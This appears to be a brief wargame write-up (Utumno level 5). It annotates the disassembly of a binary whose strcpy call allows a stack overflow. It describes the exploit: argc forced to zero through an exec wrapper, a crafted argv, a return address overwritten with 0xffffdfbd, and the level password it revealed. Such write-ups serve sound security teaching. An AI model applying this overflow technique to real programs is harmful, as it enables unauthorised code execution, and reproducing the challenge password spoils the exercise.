disassembly:
```assembly
   0x08048516 <+0>:	push   ebp
   0x08048517 <+1>:	mov    ebp,esp
   0x08048519 <+3>:	cmp    DWORD PTR [ebp+0x8],0x0		#we need to change argc to 0
   0x0804851d <+7>:	je     0x8048533 <main+29>
   0x0804851f <+9>:	push   0x80485f0
   0x08048524 <+14>:	call   0x8048380 <puts@plt>
   0x08048529 <+19>:	add    esp,0x4
   0x0804852c <+22>:	push   0x1
   0x0804852e <+24>:	call   0x8048390 <exit@plt>
   0x08048533 <+29>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048536 <+32>:	add    eax,0x28
   0x08048539 <+35>:	mov    eax,DWORD PTR [eax]
   0x0804853b <+37>:	push   eax
   0x0804853c <+38>:	push   0x80485f5
   0x08048541 <+43>:	call   0x8048360 <printf@plt>		#we have a printf
   0x08048546 <+48>:	add    esp,0x8
   0x08048549 <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804854c <+54>:	add    eax,0x28
   0x0804854f <+57>:	mov    eax,DWORD PTR [eax]
   0x08048551 <+59>:	push   eax
   0x08048552 <+60>:	call   0x80484db <hihi>			#we send hihi func with the same arg
   0x08048557 <+65>:	add    esp,0x4				#as the one of printf...
   0x0804855a <+68>:	mov    eax,0x0				#so we can stackoverflow it...
   0x0804855f <+73>:	leave  
   0x08048560 <+74>:	ret
```
disassembly of hihi:						#some kind of strcpy function...
```assembly
0x080484db <+0>:	push   ebp
   0x080484dc <+1>:	mov    ebp,esp
   0x080484de <+3>:	sub    esp,0xc
   0x080484e1 <+6>:	push   DWORD PTR [ebp+0x8]
   0x080484e4 <+9>:	call   0x80483a0 <strlen@plt>
   0x080484e9 <+14>:	add    esp,0x4
   0x080484ec <+17>:	cmp    eax,0x13
   0x080484ef <+20>:	jbe    0x8048504 <hihi+41>
   0x080484f1 <+22>:	push   0x14
   0x080484f3 <+24>:	push   DWORD PTR [ebp+0x8]
   0x080484f6 <+27>:	lea    eax,[ebp-0xc]
   0x080484f9 <+30>:	push   eax
   0x080484fa <+31>:	call   0x80483c0 <strncpy@plt>		#strcpy - me like!
   0x080484ff <+36>:	add    esp,0xc
   0x08048502 <+39>:	jmp    0x8048513 <hihi+56>
   0x08048504 <+41>:	push   DWORD PTR [ebp+0x8]
   0x08048507 <+44>:	lea    eax,[ebp-0xc]
   0x0804850a <+47>:	push   eax
   0x0804850b <+48>:	call   0x8048370 <strcpy@plt>		#strcpy
   0x08048510 <+53>:	add    esp,0x8
   0x08048513 <+56>:	nop
   0x08048514 <+57>:	leave  
   0x08048515 <+58>:	ret 
```
(very much like utumno2)
using an external exec file...
so we try a few argv... we try and get: seg fault! for:
argv = {"AAAA", "AAAA", "AAAA", "AAAA" ,"AAAA","AAAA","AAAA","AAAA","AAAA","BBBBBBBBBBBBFFFFQQQQ"}

replace QQQQ with 0xffffdfbd

use ut5.c...

we get:
eiluquieth




